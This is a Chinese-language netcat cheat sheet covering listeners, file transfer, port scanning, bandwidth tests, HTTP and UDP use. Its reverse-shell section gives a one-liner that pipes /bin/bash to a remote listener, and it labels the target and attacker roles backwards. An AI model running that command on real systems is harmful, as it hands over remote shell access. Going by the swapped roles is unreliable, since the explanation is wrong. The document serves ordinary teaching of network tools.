# nc(netcat) 是网络测试与调试的瑞士军刀


# 作为服务器监听端口
nc -l -p <port>
例如，nc -l -p 12345 在端口 12345 上启动一个监听服务器
在较新的版本中，可以使用简化语法：nc -l 12345

# 作为客户端连接到服务器
nc <hostname> <port>
例如，nc 192.168.1.100 12345 连接到 IP 地址 192.168.1.100 的 12345 端口

# 传输文件

## 发送文件
nc <hostname> <port> < <file>
例如：nc 192.168.1.100 12345 < file.txt。

## 接收文件
nc -l -p <port> > <file>
例如：nc -l -p 12345 > file.txt。

# 扫描端口
nc -zv <hostname> <port-range>
-z：只扫描，不发送数据。
-v：显示详细信息。
例如：
nc -zv 192.168.1.1 1-1000
扫描 IP 地址 192.168.1.1 的 1 到 1000 端口。

# 发送数据到服务器
echo "<message>" | nc <hostname> <port>
例如：
echo "Hello, World!" | nc 192.168.1.100 12345

# 测试网络带宽
## 服务器端
nc -l -p <port> > /dev/null
例如：nc -l -p 12345 > /dev/null。

## 客户端
yes | nc <hostname> <port>
例如：yes | nc 192.168.1.100 12345。
使用 yes 连续发送数据流，测试带宽速度。

# 建立简易聊天
## 监听端（服务器）
nc -l -p <port>
例如：nc -l -p 12345。

## 客户端
nc <hostname> <port>
例如：nc 192.168.1.100 12345。

# 双方可以输入消息并实时通信。
## 模拟 HTTP 请求
echo -e "GET / HTTP/1.1\\r\\nHost: <hostname>\\r\\n\\r\\n" | nc <hostname> 80
例如：
echo -e "GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n" | nc example.com 80

# UDP 流量测试
## 服务器端（监听 UDP 流量）
nc -u -l -p <port>
例如：nc -u -l -p 12345。

## 客户端
nc -u <hostname> <port>
例如：nc -u 192.168.1.100 12345

# 反向 Shell（慎用！）

## 目标机器（监听反向连接）
nc -l -p <port>

## 攻击者机器（反向连接）
nc <hostname> <port> -e /bin/bash
例如：
nc 192.168.1.100 12345 -e /bin/bash


# 设置连接超时
nc -w <seconds> <hostname> <port>
例如：nc -w 5 192.168.1.100 12345 设置超时时间为 5 秒

# 忽略 DNS 解析
nc -n <hostname> <port>
例如：nc -n 192.168.1.100 12345

# 示例命令合集：

## 启动服务器并接收文件：
nc -l 12345 > received.txt

## 连接服务器并发送文件：
nc 192.168.1.100 12345 < file.txt

## 扫描端口范围：
nc -zv 192.168.1.1 80-100

## 建立一个 UDP 聊天：
nc -u -l 12345
nc -u 192.168.1.100 12345